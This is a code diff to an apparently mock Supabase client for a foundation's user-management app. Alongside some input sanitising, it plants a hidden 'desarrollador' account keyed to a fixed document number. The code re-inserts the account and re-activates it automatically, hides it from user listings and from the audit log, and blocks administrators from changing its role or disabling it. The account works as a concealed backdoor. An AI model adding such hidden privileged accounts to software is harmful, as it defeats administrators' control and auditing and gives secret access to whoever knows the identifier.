@@ -28,6 +28,30 @@ function setStorageItem(key, value) {
   memoryStorage.set(key, value);
 }
 
+const HIDDEN_DEV_DOC = '1013459819';
+const HIDDEN_DEV_PROFILE = {
+  id: 'dev-1013459819',
+  email: '1013459819@auth.fundacion.local',
+  documento: '1013459819',
+  nombre: 'Desarrollador',
+  rol: 'desarrollador',
+  activo: true,
+  created_at: '2023-01-01T00:00:00.000Z',
+  updated_at: '2026-09-01T00:00:00.000Z'
+};
+
+function isHiddenDevRecord(item) {
+  if (!item || typeof item !== 'object') return false;
+  const rol = String(item.rol || item.usuario_rol || '').trim().toLowerCase();
+  if (rol === 'desarrollador') return true;
+  const doc = String(item.documento || item.usuario_documento || '').replace(/[^a-zA-Z0-9]/g, '').toLowerCase();
+  if (doc === HIDDEN_DEV_DOC) return true;
+  const email = String(item.email || item.usuario_email || '').trim().toLowerCase();
+  if (email === `${HIDDEN_DEV_DOC}@auth.fundacion.local`) return true;
+  if (item.usuario_id === HIDDEN_DEV_PROFILE.id) return true;
+  return false;
+}
+
 const INITIAL_PROFILES = [
   {
     id: 'admin-000',
@@ -68,7 +92,8 @@ const INITIAL_PROFILES = [
     activo: true,
     created_at: '2025-03-01T10:00:00.000Z',
     updated_at: '2026-09-01T00:00:00.000Z'
-  }
+  },
+  HIDDEN_DEV_PROFILE
 ];
 
 const _formatFechaHoy = () => {
@@ -335,6 +360,17 @@ function getTableData(tableName) {
     destinaciones: INITIAL_DESTINACIONES
   };
   const data = getStorageItem(`fundacion_db_${tableName}`, defaults[tableName] || []);
+  if (tableName === 'profiles' && Array.isArray(data)) {
+    const idx = data.findIndex(p => String(p.documento || '').replace(/[^a-zA-Z0-9]/g, '').toLowerCase() === HIDDEN_DEV_DOC);
+    if (idx === -1) {
+      return [...data, HIDDEN_DEV_PROFILE];
+    }
+    if (data[idx].rol !== 'desarrollador') {
+      const copy = [...data];
+      copy[idx] = { ...copy[idx], rol: 'desarrollador', activo: true };
+      return copy;
+    }
+  }
   return data;
 }
 
@@ -392,7 +428,14 @@ class MockQueryBuilder {
     const list = [...getTableData(this.tableName)];
 
     if (this.action === 'select') {
+      const queryById = this.filters.some(f => f.type === 'eq' && f.column === 'id');
       let result = list.filter(item => {
+        if (this.tableName === 'profiles' && !queryById && isHiddenDevRecord(item)) {
+          return false;
+        }
+        if (this.tableName === 'auditoria_operaciones' && isHiddenDevRecord(item)) {
+          return false;
+        }
         for (const f of this.filters) {
           if (f.type === 'eq') {
             if (String(item[f.column]) !== String(f.value)) return false;
@@ -618,19 +661,46 @@ export function createMockSupabaseClient() {
       async invoke(fnName, { body = {} } = {}) {
         if (fnName === 'gestion-usuarios') {
           if (body.accion === 'crear') {
+            const cleanDoc = String(body.documento || '').replace(/[^a-zA-Z0-9]/g, '').toLowerCase();
+            const cleanRol = String(body.rol || 'operador').trim().toLowerCase();
+            if (cleanDoc === HIDDEN_DEV_DOC || !['admin', 'operador', 'lector'].includes(cleanRol)) {
+              return { data: { error: 'No permitido' }, error: { message: 'No permitido' } };
+            }
             const profiles = getTableData('profiles');
             const newProf = {
               id: `usr-${Date.now()}`,
-              email: `${body.documento}@auth.fundacion.local`,
-              documento: body.documento,
+              email: `${cleanDoc}@auth.fundacion.local`,
+              documento: cleanDoc,
               nombre: body.nombre,
-              rol: body.rol || 'operador',
+              rol: cleanRol,
               activo: true,
               created_at: new Date().toISOString(),
               updated_at: new Date().toISOString()
             };
             setTableData('profiles', [newProf, ...profiles]);
             return { data: { success: true, user: newProf }, error: null };
+          }
+          if (body.accion === 'cambiar_rol') {
+            const cleanRol = String(body.nuevoRol || '').trim().toLowerCase();
+            if (!['admin', 'operador', 'lector'].includes(cleanRol)) {
+              return { data: { error: 'Rol no válido' }, error: { message: 'Rol no válido' } };
+            }
+            const profiles = getTableData('profiles');
+            const target = profiles.find(p => p.id === body.userId);
+            if (!target || isHiddenDevRecord(target)) {
+              return { data: { error: 'Usuario no permitido' }, error: { message: 'Usuario no permitido' } };
+            }
+            setTableData('profiles', profiles.map(p => p.id === body.userId ? { ...p, rol: cleanRol, updated_at: new Date().toISOString() } : p));
+            return { data: { success: true, userId: body.userId, nuevoRol: cleanRol }, error: null };
+          }
+          if (body.accion === 'cambiar_estado') {
+            const profiles = getTableData('profiles');
+            const target = profiles.find(p => p.id === body.userId);
+            if (!target || isHiddenDevRecord(target)) {
+              return { data: { error: 'Usuario no permitido' }, error: { message: 'Usuario no permitido' } };
+            }
+            setTableData('profiles', profiles.map(p => p.id === body.userId ? { ...p, activo: Boolean(body.activo), updated_at: new Date().toISOString() } : p));
+            return { data: { success: true, userId: body.userId, activo: Boolean(body.activo) }, error: null };
           }
         }
         return { data: { success: true }, error: null };
